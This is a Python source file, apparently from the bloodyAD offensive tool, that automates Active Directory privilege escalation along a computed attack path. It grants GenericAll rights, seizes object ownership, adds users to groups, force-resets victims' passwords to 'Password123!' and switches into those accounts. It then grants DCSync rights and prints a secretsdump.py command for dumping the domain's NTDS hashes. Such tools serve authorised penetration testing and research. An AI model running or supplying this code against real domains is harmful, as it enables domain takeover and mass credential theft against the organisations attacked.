from bloodyAD import config, modules, utils

LOG = utils.LOG
class Automation:
    def __init__(self, args):
        self.conn = config.ConnectionHandler(args=args)
        self.rel_types = {
            0 : self._nextHop,
            1 : self._dcSync,
            2 : self._setDCSync,
            3 : self._ownerDomain,
            100 : self._addMember,
            200 : self._aclGroup,
            300 : self._ownerGroup,
            100000 : self._forceChangePassword,
            100001 : self._aclObj,
            100002 : self._ownerObj,
            100100 : self._forceChangePassword,
            100101 : self._aclObj,
            100102 : self._ownerObj,
            250: self._genericAll,
            350: self._ownerSpecialObj
        }
        self.dirty_laundry = []

    # TODO: allow simulation before run
    def exploit(self, path):
        for rel in path:
            print()
            typeID = rel['cost']
            try:
                self.rel_types[typeID](rel)
            except Exception as e:
                self._washer()
                raise e
        self._washer()
        self.conn.close()

    def _washer(self):
        for laundry in self.dirty_laundry:
            laundry['f'](self.conn, *laundry['args'])
        self.dirty_laundry = []

    def _switchUser(self, user, pwd):
        self._washer()
        self.conn.switchUser(user, pwd)

    def _nextHop(self, rel):
        return
    
    def _dcSync(self, rel):
        print(f"[+] You can now dump the NTDS using: secretsdump.py '{self.conn.conf.domain}/{self.conn.conf.username}:{self.conn.conf.password}@{self.conn.conf.host}'")
        return
    
    def _setDCSync(self, rel):
        user = rel['start_node']['distinguishedname']
        modules.setDCSync(user)
        self.dirty_laundry.append({'f':modules.setDCSync, 'args':[user,'False']})
    
    def _ownerDomain(self, rel):
        self._setOwner(rel)
        self._setDCSync(rel)

    def _addMember(self, rel):
        member = rel['start_node']['objectid']
        group = rel['end_node']['distinguishedname']
        modules.addForeignObjectToGroup(self.conn, member, group)
        self.dirty_laundry.append({'f':modules.delObjectFromGroup, 'args':[member,group]})
        self.conn.close()
    
    def _aclGroup(self, rel):
        self._genericAll(rel)
        self._addMember(rel)
    
    def _ownerGroup(self, rel):
        self._setOwner(rel)
        self._aclGroup(rel)
    
    def _aclObj(self, rel):
        self._genericAll(rel)
        self._forceChangePassword(rel)
    
    def _ownerObj(self, rel):
        self._setOwner(rel)
        self._aclObj(rel)
    
    def _ownerSpecialObj(self, rel):
        self._setOwner(rel)
        self._genericAll(rel)

    # TODO: change password change with shadow credentials when it's possible
    # TODO: don't perform change password if it's explicitly refused by user
    def _forceChangePassword(self, rel):
        user = rel['end_node']['distinguishedname']
        pwd = 'Password123!'
        LOG.debug(f'[+] changing {user} password')
        modules.changePassword(self.conn, user, pwd)
        LOG.info(f'[+] password changed to {pwd} for {user}')
        user = utils.getObjAttr(self.conn, user, 'sAMAccountName')['attributes']['sAMAccountName']
        self._switchUser(user, pwd)
        LOG.debug(f'[+] switching to LDAP/SAMR connection for user {user}')

    def _genericAll(self, rel):
        user = rel['start_node']['distinguishedname']
        target = rel['end_node']['distinguishedname']
        modules.setGenericAll(self.conn, user, target)
        self.dirty_laundry.append({'f':modules.setGenericAll, 'args':[user,target,'False']})
    
    def _setOwner(self, rel):
        user = rel['start_node']['distinguishedname']
        target = rel['end_node']['distinguishedname']
        old_sid = modules.setOwner(self.conn, user, target)
        self.dirty_laundry.append({'f':modules.setGenericAll, 'args':[old_sid,target]})
